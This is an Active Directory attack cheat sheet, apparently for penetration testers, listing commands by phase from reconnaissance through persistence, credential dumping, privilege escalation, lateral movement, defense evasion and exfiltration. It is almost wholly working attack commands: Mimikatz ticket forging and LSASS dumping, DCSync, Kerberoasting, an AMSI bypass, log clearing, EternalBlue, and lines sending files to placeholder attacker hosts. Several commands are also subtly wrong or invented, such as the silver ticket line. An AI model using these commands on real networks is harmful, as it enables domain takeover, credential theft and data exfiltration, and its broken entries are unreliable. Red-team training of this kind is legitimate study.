# Active Directory Cheat Sheet

## Index

* \[\[Microsoft Active Directory (AD)]]
  * \[\[Active Directory Cheat Sheet]]
  * \[\[Kerberos Cheat Sheet]]
  * \[\[LDAP Cheat Sheet]]
  * \[\[MSSQL Cheat Sheet]]
  * \[\[PowerShell Active Directory Cheat Sheet]]

## 1. External Reconnaissance&#x20;

**1.1 Enumerate Domain Controllers**&#x20;

*   **nmap**:

    ```bash
    nmap -p <target_port> --script "ldap*,smb*,msrpc*,krb5-enum-users" -v -oA ldap-enum <target_ip>
    ```
*   **rpcclient**:

    ```bash
    rpcclient -U "" <target_ip>
    ```

**1.2 Enumerate Domain Information**&#x20;

*   **netdiscover (for Windows)**:

    ```bash
    netdiscover -r <target_ip_range>
    ```
*   **ldapsearch (Linux)**:

    ```bash
    ldapsearch -x -H ldap://<target_ip> -b "DC=domain,DC=com"
    ```
*   **PowerView (Windows)**:

    ```powershell
    Import-Module PowerView
    Get-NetDomain
    Get-NetDomainController
    ```

**1.3 Gather Domain User Information**&#x20;

*   **rpcclient**:

    ```bash
    rpcclient -U "" <target_ip> -c "enumdomusers"
    ```
*   **CrackMapExec (CME)**:

    ```bash
    cme smb <target_ip> -u '' -p '' --users
    ```
*   **BloodHound**:

    ```powershell
    Import-Module SharpHound
    Invoke-BloodHound -CollectionMethod All
    ```

**1.4 Enumerate GPOs (Group Policy Objects)**&#x20;

*   **PowerView**:

    ```powershell
    Get-NetGPO
    Get-NetGPO | %{Get-ObjectACL -DistinguishedName $_.distinguishedname -ResolveGUIDs}
    ```
*   **GPOTool**:

    ```bash
    gpotool /dc:<target_domain_controller>
    ```

**1.5 Enumerate Active Sessions**&#x20;

*   **Logged On Users (PowerView)**:

    ```powershell
    Get-NetLoggedon -ComputerName <target_ip>
    ```
*   **NetSessionEnum**:

    ```bash
    net session \\<target_ip>
    ```

**1.6 Enumerate Installed Software**:

*   **PowerUp**:

    ```powershell
    Get-RemoteProgram -ComputerName <target_ip>
    ```
*   **WMIC**:

    ```bash
    wmic /node:<target_ip> product get name, version
    ```

**1.6 Enumerate Local Admins**&#x20;

*   **PowerView**:

    ```powershell
    Get-NetLocalGroup -ComputerName <target_ip> -GroupName Administrators
    ```
*   **CrackMapExec (CME)**:

    ```bash
    cme smb <target_ip> -u <username> -p <password> --local-admins
    ```

**1.7 Enumerate Domain Admins**&#x20;

*   **PowerView**:

    ```powershell
    Get-NetGroupMember -GroupName "Domain Admins"
    ```

**1.8 Enumerate Shares**&#x20;

*   **CrackMapExec (CME)**:

    ```bash
    cme smb <target_ip> -u <username> -p <password> --shares
    ```
*   **SMBClient**:

    ```bash
    smbclient -L //<target_ip> -U <username>
    ```

**1.9 Enumerate DNS Records**&#x20;

*   **dnscmd (Windows)**:

    ```powershell
    dnscmd <target_ip> /enumrecords <zone_name> /type A
    ```
*   **dnsrecon (Linux)**:

    ```bash
    dnsrecon -d <domain> -t axfr
    ```

**1.10 Enumerate Kerberos Tickets**&#x20;

*   **Rubeus**:

    ```powershell
    Rubeus.exe dump
    ```

**1.11 Enumerate AD Trusts**&#x20;

*   **PowerView**:

    ```powershell
    Get-NetDomainTrust
    ```

**1.12 Enumerate LAPS (Local Administrator Password Solution)**&#x20;

*   **Get-LAPS**:

    ```powershell
    Get-ADComputer -Filter * -Property ms-Mcs-AdmPwd
    ```

## 2. Initial Access&#x20;

## 3. Persistence&#x20;

**3.1 Golden Ticket Attack**&#x20;

*   **Mimikatz**:

    ```powershell
    kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<NTLM_hash> /id:<user_id>
    ```

**3.2 Silver Ticket Attack**&#x20;

*   **Mimikatz**:

    ```powershell
    tgt::deleg /domain:<domain> /sid:<SID> /target:<target_server> /rc4:<NTLM hash> /user:<username> /service:krbtgt
    ```

**3.3 Skeleton Key Attack**&#x20;

*   **Mimikatz**:

    ```powershell
    privilege::debug
    misc::skeleton
    ```

**3.4 Backdooring User Accounts**&#x20;

*   **Invoke-UserBackdoor**:

    ```powershell
    Invoke-UserBackdoor -UserName <username> -NewPass <password>
    ```

**3.5 Backdoor Accounts via ACLs**&#x20;

*   **Set DACL to Grant Attacker Control**:

    ```powershell
    Add-DomainObjectAcl -TargetIdentity <target_account> -PrincipalIdentity <attacker_user> -Rights All
    ```

**3.6 Persistence via Malicious GPOs**&#x20;

*   **Deploy Malicious GPO**:

    ```powershell
    Invoke-GPOInstall -Path \\<domain>\SYSVOL\<domain>\Policies\{GPO_GUID}\Machine\Scripts\Startup
    ```

## 4. Credential Harvesting&#x20;

**4.1 Brute Forcing**&#x20;

*   **THC-Hydra**:

    ```bash
    hydra -l <username> -P /path/to/passwords.txt smb://<target_ip>
    ```

**4.2 Password Spraying**&#x20;

*   **CrackMapExec (CME)**:

    ```bash
    cme smb <target_ip_range> -u username_list.txt -p password
    ```
*   **Kerbrute (for Kerberos)**:

    ```bash
    ./kerbrute -domain domain.com -users users.txt -passwords passwords.txt -threads 5
    ```

**4.3 Extract Password Hashes**&#x20;

*   **SecretsDump (Impacket)**:

    ```bash
    secretsdump.py <domain>/<username>:<password>@<target_ip>
    ```
*   **Mimikatz (Windows)**:

    ```powershell
    mimikatz # sekurlsa::logonpasswords
    ```

**4.4 Dump Credentials from LSASS**&#x20;

*   **Mimikatz**:

    ```powershell
    sekurlsa::logonpasswords
    ```
*   **Procdump (Windows)**:

    ```bash
    procdump64.exe -ma lsass.exe lsass.dmp
    ```

**4.5 Dump Cached Credentials**&#x20;

*   **Mimikatz**:

    ```powershell
    sekurlsa::logonpasswords /patch
    ```

**4.6 Dump NTDS.dit**&#x20;

*   **ntdsutil (Windows)**:

    ```bash
    ntdsutil "ac i ntds" "ifm" "create full C:\temp\ntds" q q
    ```
*   **Impacket's secretsdump**:

    ```bash
    secretsdump.py -just-dc <domain>/<username>:<password>@<target_ip>
    ```

## 5. Privilege Escalation&#x20;

**5.1 Pass-the-Hash Attack**&#x20;

*   **Pass-the-Hash with Mimikatz**:

    ```powershell
    sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:cmd.exe
    ```

**5.2 Kerberoasting**&#x20;

*   **Invoke-Kerberoast**:

    ```powershell
    Invoke-Kerberoast -OutputFormat Hashcat | Out-File kerberoast.txt
    ```
*   **Rubeus**:

    ```powershell
    Rubeus.exe kerberoast
    ```
*   **Request and Crack Service Tickets**:

    ```bash
    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
    hashcat -m 13100 <hash> /path/to/wordlist.txt
    ```

**5.3 Abusing GPOs (Group Policy Objects)**&#x20;

*   **SharpGPOAbuse**:

    ```powershell
    SharpGPOAbuse -AddUserToLocalGroup -UserAccount your_user -GroupName "Administrators" -GPOName "Default Domain Policy"
    ```

**5.4 Abusing Group Policy Preferences (GPP)**&#x20;

*   **gpp-decrypt (Linux)**:

    ```bash
    gpp-decrypt <cpassword>
    ```

    Decrypting passwords stored in GPP.

**5.5 DCSync Attack (Replicating Directory)**&#x20;

*   **Mimikatz**:

    ```powershell
    lsadump::dcsync /user:<domain>\<username>
    ```
*   **Impacket’s secretsdump.py**:

    ```bash
    secretsdump.py -just-dc <domain>/<username>:<password>@<target_ip>
    ```

**5.6 Exploiting Misconfigured Services**&#x20;

*   **PowerUp (Windows)**:

    ```powershell
    Import-Module PowerUp
    Invoke-AllChecks
    ```

**5.7 Abusing Unconstrained Delegation**&#x20;

*   **Mimikatz (Windows)**:

    ```powershell
    mimikatz # sekurlsa::tickets
    ```
*   **Impacket’s GetUserSPNs.py**:

    ```bash
    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
    ```

**5.8 Abusing TrustedForDelegation Privilege**&#x20;

*   **PowerView**:

    ```powershell
    Get-DomainUser -TrustedToAuth
    Get-DomainComputer -TrustedToAuth
    ```

**5.9 Token Impersonation (Windows)**&#x20;

*   **Incognito (Windows)**:

    ```powershell
    token::elevate
    ```

**5.10 Abusing Service Accounts**&#x20;

*   **Kerberoasting with Rubeus**:

    ```powershell
    Rubeus.exe kerberoast
    ```

    Crack the ticket with Hashcat:

    ```bash
    hashcat -m 13100 <ticket_hash> /path/to/wordlist.txt
    ```

**5.11 Abusing DNSAdmins**&#x20;

*   **Abuse DNSAdmin Privilege**: Load malicious DLL via DNSAdmins privilege.

    ```powershell
    dnscmd <target_ip> /config /serverlevelplugindll \\<attacker_ip>\share\dll
    ```

**5.12 Abusing Passwords in SYSVOL**&#x20;

*   **GPP Password Decryption**:

    ```bash
    gpp-decrypt <cpassword>
    ```

**5.13 Exploiting Weak ACLs**&#x20;

*   **Abuse WriteDACL Permissions**:

    ```powershell
    Add-DomainObjectAcl -TargetIdentity <target_object> -PrincipalIdentity <attacker_user> -Rights DCSync
    ```

## 6. Internal Reconnaissance&#x20;

**6.1 Data Extraction**&#x20;

*   **SharpHound (BloodHound)**:

    ```powershell
    Invoke-BloodHound -CollectionMethod All
    ```

**6.2 Sensitive File Searching**&#x20;

*   **Invoke-FileFinder**:

    ```powershell
    Invoke-FileFinder -SearchWordList passwords.txt
    ```

## 7. Lateral Movement, Pivoting, and Tunnelling&#x20;

**7.1 Pass-the-Hash (PtH)**&#x20;

*   **Impacket’s WMIExec**:

    ```bash
    wmiexec.py <domain>/<username>:<NTLM_hash>@<target_ip>
    ```
*   **Evil-WinRM**:

    ```bash
    evil-winrm -i <target_ip> -u <username> -H <NTLM_hash>
    ```

**7.2 Overpass-the-Hash (Pass-the-Key)**&#x20;

*   **Mimikatz**:

    ```powershell
    sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /rc4:<NTLM_hash> /run:cmd.exe
    ```

**7.3 Pass-the-Ticket (PTT) Attack**&#x20;

*   **Mimikatz**:

    ```powershell
    kerberos::ptt <ticket.kirbi>
    ```

    Use this command after extracting a TGT or TGS ticket to impersonate a user on the domain.

**7.4 Lateral Movement via SSH**&#x20;

*   **SSHPass (Linux)**:

    ```bash
    sshpass -p <password> ssh <username>@<target_ip>
    ```

**7.5 Remote Desktop Protocol (RDP)**&#x20;

*   **rdesktop**:

    ```bash
    rdesktop -u <username> -p <password> <target_ip>
    ```
*   **xfreerdp (Linux)**:

    ```bash
    xfreerdp /u:<username> /p:<password> /v:<target_ip>
    ```

**7.6 Lateral Movement via SMB**&#x20;

*   **CrackMapExec (CME)**:

    ```bash
    cme smb <target_ip> -u <username> -H <NTLM_hash> -x <command>
    ```
*   **PsExec (Impacket)**:

    ```bash
    psexec.py <domain>/<username>:<password>@<target_ip> cmd.exe
    ```

**7.7 Lateral Movement via PSExec**&#x20;

*   **PsExec**:

    ```bash
    psexec.py <domain>/<username>:<password>@<target_ip>
    ```

**7.8 Lateral Movement via WMIExec**&#x20;

*   **WMIExec (Impacket)**:

    ```bash
    wmiexec.py <domain>/<username>:<password>@<target_ip>
    ```
*   **Invoke-WmiMethod (PowerShell)**:

    ```powershell
    Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c <command>" -ComputerName <target_ip>
    ```

**7.9 Lateral Movement via DCOM**&#x20;

*   **Invoke-DCOM (PowerShell)**:

    ```powershell
    Invoke-DCOM -ComputerName <target_ip> -Method ShellExecute -Command "powershell.exe"
    ```

**7.10 SMB Relay Attack**&#x20;

*   **Impacket’s ntlmrelayx**:

    ```bash
    ntlmrelayx.py -tf targets.txt -smb2support
    ```

## 8. Defense Evasion&#x20;

**8.1 Clearing Event Logs**&#x20;

*   **Wevtutil**:

    ```powershell
    wevtutil cl System
    wevtutil cl Security
    wevtutil cl Application
    ```

**8.2 Disabling Security Tools**&#x20;

*   **Invoke-Obfuscation (PowerShell)**:

    ```powershell
    Invoke-Obfuscation -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true }
    ```

**8.3 Process Injection**&#x20;

*   **Invoke-ReflectivePEInjection**:

    ```powershell
    Invoke-ReflectivePEInjection -PEBytes (Get-Content calc.exe -Raw) -ProcID <PID>
    ```

**8.4 UAC Bypass**&#x20;

*   **UACMe**:

    ```powershell
    .\uacme.exe
    ```

**8.5 Bypass PowerShell Script Block Logging**&#x20;

*   **Obfuscate PowerShell Scripts**:

    ```powershell
    Invoke-Obfuscation
    ```

**8.6 Bypass AMSI (Antimalware Scan Interface)**&#x20;

*   **AMSI Bypass in PowerShell**:

    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    ```

**8.7 Evade UAC (User Account Control)**&#x20;

*   **UACMe (Windows)**:

    ```powershell
    .\uacme.exe
    ```

**8.8 Bypass Network Access Controls**&#x20;

*   **Pivoting with SSH Tunnels**:

    ```bash
    ssh -L <local_port>:<target_ip>:<target_port> <attacker_ip>
    ```
*   **VPN Pivoting**:

    ```bash
    openvpn --config <vpn_config.ovpn>
    ```

## 9. Data Exfiltration&#x20;

**9.1 Data Exfiltration via HTTPS**&#x20;

*   **Invoke-WebRequest (PowerShell)**:

    ```powershell
    $data = Get-Content C:\SensitiveData.txt
    Invoke-WebRequest -Uri https://<attacker_server>/upload -Method POST -Body $data
    ```

**9.2 Exfiltration via DNS**&#x20;

*   **DnsExfiltrator**:

    ```bash
    dnsexfiltrator -i ens33 -d attacker.com -f /etc/passwd
    ```
*   **Dnscat2**:

    ```bash
    dnscat2-client <target_domain>
    ```

**9.3 Exfiltration via SMB\*\***&#x20;

*   **SMBClient**:

    ```bash
    smbclient //target/share -U <username> -c 'prompt off; mget *'
    ```

**9.4 Data Exfiltration via ICMP**&#x20;

*   **PowerShell (Invoke-PingExfil)**:

    ```powershell
    Invoke-PingExfil -FilePath C:\sensitive_data.txt -DestinationIP <attacker_ip>
    ```

**9.4 Exfiltration via Rclone**&#x20;

*   **Exfil with Rclone**:

    ```bash
    rclone copy /path/to/data remote:bucket
    ```

## 10. Reporting and Cleanup&#x20;

**10.1 Generate Comprehensive Report**&#x20;

*   **Dradis Framework**:

    ```bash
    dradis
    ```

    Useful for organizing findings and generating reports.

**10.2 Remove Tools and Artifacts**&#x20;

*   **PowerShell**:

    ```powershell
    Remove-Item -Path C:\Temp\* -Recurse
    Clear-History
    ```

**10.3 Reset Permissions**&#x20;

*   **PowerView**:

    ```powershell
    Invoke-ACLReset -Path "CN=AdminSDHolder,CN=System,DC=domain,DC=com"
    ```

**10.4 Log Out and End Session**&#x20;

*   **PowerShell**:

    ```powershell
    Stop-Process -Name explorer
    ```

## 11. Attack Techniques on Specific AD Services&#x20;

### 11.2 LDAP&#x20;

**11.1.1 LDAP (Lightweight Directory Access Protocol)**&#x20;

*   **ldapsearch**:

    ```bash
    ldapsearch -x -H ldap://<target_ip> -b "dc=domain,dc=com"
    ```
*   **CrackMapExec (CME)**:

    ```bash
    cme ldap <target_ip> -u <username> -p <password> -M ldap_search -o "base=DC=domain,DC=com"
    ```

### 11.2 SMB&#x20;

**11.2.1 SMB (Server Message Block)**&#x20;

*   **EternalBlue Exploit (Metasploit)**:

    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS <target_ip>
    run
    ```

### 11.3 RPC&#x20;

**11.3.1 RPC (Remote Procedure Call)**&#x20;

*   **rpcclient**:

    ```bash
    rpcclient -U "<username>%<password>" <target_ip> -c "enumdomusers"
    ```

### 11.4 MSSQL&#x20;

**11.4.1 MSSQL Server**&#x20;

*   **SQLCMD (Linux)**:

    ```bash
    sqlcmd -S <target_ip> -U <username> -P <password>
    ```
*   **CrackMapExec (CME)**:

    ```bash
    cme mssql <target_ip> -u <username> -p <password> --xp_cmdshell
    ```

### 11.5 RPD&#x20;

**11.5.1 RDP (Remote Desktop Protocol)**&#x20;

*   **RDP Client (Linux)**:

    ```bash
    rdesktop -u <username> -p <password> <target_ip>
    ```
*   **CrackMapExec (CME)**:

    ```bash
    cme rdp <target_ip> -u <username> -p <password> --exec "powershell.exe"
    ```

### 11.6 Kerberos&#x20;

**11.6.1 Kerberos Service Ticket Enumeration**&#x20;

*   **GetUserSPNs (Impacket)**:

    ```bash
    GetUserSPNs.py <domain>/<username>:<password> -dc-ip <target_ip> -request
    ```

**11.6.2 AS-REP Roasting**&#x20;

*   **Rubeus**:

    ```powershell
    Rubeus.exe asreproast /user:<username>
    ```

    Crack with Hashcat:

    ```bash
    hashcat -m 18200 <asrep_hash> /path/to/wordlist.txt
    ```

**11.6.3 Constrained Delegation Abuse**&#x20;

*   **PowerView**:

    ```powershell
    Get-DomainUser -TrustedToAuth
    Set-DomainObject -Identity "<computer_account>" -Set @{msDS-AllowedToDelegateTo="HOST/<target_service>"}
    ```
*   **S4U2Self Attack (Rubeus)**:

    ```powershell
    Rubeus.exe s4u /user:<username> /rc4:<hash> /impersonateuser:<target_user> /msdsspn:<target_service>
    ```

**11.6.4 Kerberos Unconstrained Delegation**&#x20;

*   **Rubeus**:

    ```powershell
    Rubeus.exe tgtdeleg /target:<target_computer>
    ```

## 12. Domain Trust Exploitation&#x20;

**12.1 Enumerating Trusts**&#x20;

*   **PowerView**:

    ```powershell
    Get-NetForest
    Get-NetForestDomain
    Get-NetDomainTrust
    Get-NetForestTrust
    ```

**12.2 Exploiting Inter-Trust Relationships**&#x20;

* **ADExplorer**: Enumerate trust relationships and attack via SID History.
*   **BloodHound**:

    ```powershell
    Invoke-BloodHound -CollectionMethod Trusts
    ```

**12.3 Abusing SID History**&#x20;

*   **Mimikatz**:

    ```powershell
    kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID>-500 /sids:<target_domain_SID>-519 /krbtgt:<NTLM_hash> /target:<target_domain> /rc4:<NTLM_hash>
    ```

## 13. Domain Persistence Techniques&#x20;

**13.1 Persistence via AdminSDHolder**&#x20;

*   **PowerView**:

    ```powershell
    Set-DomainObject -Identity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -Set @{msds-allowedtoactonbehalfofotheridentity=Get-ACL}
    ```

**13.2 Persistence via SID History**&#x20;

*   **Invoke-SIDHistoryInjection**:

    ```powershell
    Invoke-SIDHistoryInjection -UserName <target_user> -SIDHistory <SID_to_inject>
    ```

**13.3 Backdooring Accounts via ACLs**&#x20;

*   **PowerView**:

    ```powershell
    Add-DomainObjectAcl -TargetIdentity <TargetUser> -PrincipalIdentity <AttackerUser> -Rights DCSync
    ```

**13.4 ACL Abuse for Persistence**&#x20;

*   **Aclpwn.py**:

    ```bash
    aclpwn --domain <domain> --username <username> --password <password> --command-backdoor --target <target_user>
    ```
